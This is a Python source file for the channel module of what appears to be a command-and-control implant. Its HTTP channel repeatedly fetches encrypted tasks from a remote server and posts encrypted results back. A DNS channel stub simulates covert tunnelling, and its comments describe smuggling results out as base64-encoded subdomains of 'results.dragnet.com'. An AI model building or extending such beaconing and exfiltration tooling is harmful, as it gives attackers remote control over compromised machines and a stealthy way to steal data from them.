
import requests
import time
import base64
from abc import ABC, abstractmethod


from crypto_utils import encrypt, decrypt



class BaseChannel(ABC):
    """
    A template for all communication channels.
    It guarantees that every channel will have a .get_task() 
    and a .submit_result() method.
    """
    def __init__(self, server_url):
        self.server_url = server_url
        print(f"[+] Channel '{self.__class__.__name__}' initialized.")
    
    @abstractmethod
    def get_task(self) -> str:
        """Gets a task from the server. Returns 'none' if no task."""
        pass
    
    @abstractmethod
    def submit_result(self, result: str):
        """Submits a result to the server."""
        pass



class HttpChannel(BaseChannel):
    """The standard communication channel using HTTP/S."""
    
    def get_task(self) -> str:
        """Gets a task via an HTTP POST request."""
        try:
            response = requests.post(f"{self.server_url}/get-task")
            if response.status_code == 200:
                encrypted_task = response.json().get('task')
                if encrypted_task and encrypted_task != "none":
                    return decrypt(encrypted_task)
            return "none"
        except requests.exceptions.ConnectionError:
            print("[!] HTTP Connection failed.")
            return "none"
        except Exception as e:
            print(f"[!] HTTP Error: {e}")
            return "none"

    def submit_result(self, result: str):
        """Submits a result via an HTTP POST request."""
        try:
            encrypted_result = encrypt(result)
            result_data = {"result": encrypted_result}
            requests.post(f"{self.server_url}/submit-result", json=result_data)
        except requests.exceptions.ConnectionError:
            print("[!] HTTP Connection failed while submitting result.")
        except Exception as e:
            print(f"[!] HTTP Error: {e}")



class DnsChannel(BaseChannel):
    """
    A placeholder for a stealthy DNS communication channel.
    This is a non-functional example to demonstrate modularity.
    A real implementation is very complex and requires a custom DNS server.
    """
    
    def get_task(self) -> str:
        """
        In a real scenario, this would query a domain like:
        'task.request.dragnet.com'
        and the auth DNS server would respond with a TXT record 
        containing the encrypted task.
        """
        print("[DNS] Polling for task (simulation)...")
        
        time.sleep(5) 
        return "none"

    def submit_result(self, result: str):
        """
        In a real scenario, this would encode the result in a
        subdomain and query it:
        '<base64_result>.results.dragnet.com'
        The server would be sniffing DNS traffic to get the result.
        """
        
        encoded_result = base64.b64encode(result.encode()).decode()[:20]
        print(f"[DNS] Submitting result via '...{encoded_result}.results.dragnet.com' (simulation)")